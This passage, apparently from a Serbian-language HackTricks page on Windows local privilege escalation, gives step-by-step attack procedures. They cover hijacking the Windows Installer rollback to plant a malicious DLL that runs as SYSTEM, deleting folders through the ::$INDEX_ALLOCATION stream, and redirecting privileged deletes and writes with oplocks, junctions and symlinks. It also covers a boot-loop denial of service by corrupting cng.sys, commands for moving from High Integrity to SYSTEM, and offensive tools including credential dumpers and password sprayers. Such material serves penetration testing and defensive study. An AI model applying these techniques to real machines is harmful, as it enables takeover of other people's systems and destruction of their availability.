Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte odvojeni zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga napravite sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` otvorenim pre nego što installer pooštri DACL. Unapred otvoreni handle može da vrati permissive DACL pomoću `NtSetSecurityObject`, nakon čega generisani `.rbs` može da se zameni pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate postavka. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju pod kontrolom napadača u `TempPackages`. Primenite bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratni rezultat metode koristite kao proveru ispravke.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika izgleda ovako:

1. **Faza 1 – Priprema za Hijack (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u folder u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"** kako bi mogao da ga pokrene **korisnik koji nije admin**.
    - Ostavite **handle** otvoren za datoteku nakon instalacije.

- Korak 2: Započnite Uninstall
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u `.rbf` datoteke (rollback backups).
    - **Poll-ujte otvoreni file handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Custom Syncing
    - `.msi` sadrži **custom uninstall action (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada primite signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan**, spreman za hijack.

> U ovom trenutku **aktivirajte ranjivost za proizvoljno brisanje foldera na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena Rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo napravite `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo napravite folder `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Instalirajte `.msi` ponovo, задајући:
        - `TARGETDIR`: lokaciju u koju može da se upisuje.
        - `ERROROUT`: promenljivu koja izaziva prinudni neuspeh.
    - Ova instalacija će ponovo pokrenuti **rollback**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs`
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Zabeležite njegovo ime datoteke.

- Korak 9: Sinhronizujte se pre Rollback-a
    - `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se napravi `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa `WRITE_DAC`, možete ponovo da **primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u folder.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerну DLL) na **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni SYSTEM-level payload DLL**.

- Korak 12: Pokrenite Rollback
    - Signalizirajte sync događaj kako bi installer nastavio.
    - **Type 19 custom action (`ErrorOut`)** je podešen da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Zbog toga **počinje rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdani **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
    - **Gotovo**: vaš kod se izvršava kao **SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Možete da iskoristite **NTFS internals**: svaki folder ima skriveni alternate data stream pod nazivom:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete da uradite pomoću standardnih API-ja za brisanje datoteka, kao što je:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitivna operacija ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu-mamac i fajl
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira foldere (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Ovo prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS stream koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Otpustite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) čije je ime isto kao ime nekog **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/backup + OM symlinks do proizvoljnog prepisivanja datoteka / boot DoS

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **config fajla u koji napadač može da upisuje**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Uslovi**
- Config koji sadrži ciljnu putanju napadač može da menja (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte config da biste saznali odredište privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „pošalji testni SMS“). Upis se sada obavlja u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu ciljnu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, ona može biti prva isprobana, što je čini pouzdanim odredištem za DoS putem oštećenih podataka.



## **Od High Integrity do System**

### **New service**

Ako već radite u procesu sa High Integrity nivoom, **put do SYSTEM** može biti jednostavan: samo **kreirajte i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada kreirate binarnu datoteku servisa, uverite se da je to validan servis ili da binarna datoteka brzo izvršava potrebne radnje, jer će biti prekinuta za 20s ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated stavke registra** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o ključevima registra i tome kako da instalirate _.msi_ paket potražite ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično se koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju privilegija pomoću `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe servisa koji piše u taj pipe**. Zatim će **server** koji je kreirao pipe koristeći privilegiju **`SeImpersonate`** moći da **imitira token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa High Integrity na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija; štaviše, **mnogo ga je lakše izvesti iz procesa sa High Integrity**, jer taj proces ima **dozvole za pisanje** u fascikle iz kojih se učitavaju dll-ovi.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriva se.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sačuvanim sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalno koristite -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Otkriva se.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate ranjivosti za privesc (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate ranjivosti za privesc (potrebno ga je kompajlirati pomoću VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za pogrešnim konfiguracijama (više služi za prikupljanje informacija nego za privesc) (potrebno ga je kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz velikog broja softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (izvršna datoteka je precompiled na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ove objave (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da pokrenete:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windowsu](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windowsu — podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica za lokalnu eskalaciju privilegija u Windowsu / Linuxu](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi hit (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windowsu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windowsu](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windowsu](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windowsu za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – U poteri za Srebrnom lisicom: mačka i miš u kernel senkama](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog pristupa sistemu datoteka u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih veza u Windowsu](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Zbogom RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js: opasno razrešavanje modula u Windowsu](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi sa C/C++ kontrolnom listom, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own uz Microslop: povezivanje CLDFLT i DirectX uslova trke u kernelu radi LPE-a u Windowsu](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: primitiva za potpuno čitanje/pisanje u Windowsu 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi korisni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Eksploit kod za FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevni lokalni propust za eskalaciju privilegija u Windowsu 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: kako promena slike dovodi do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz SSH agenta u Windowsu 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Microsoft Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
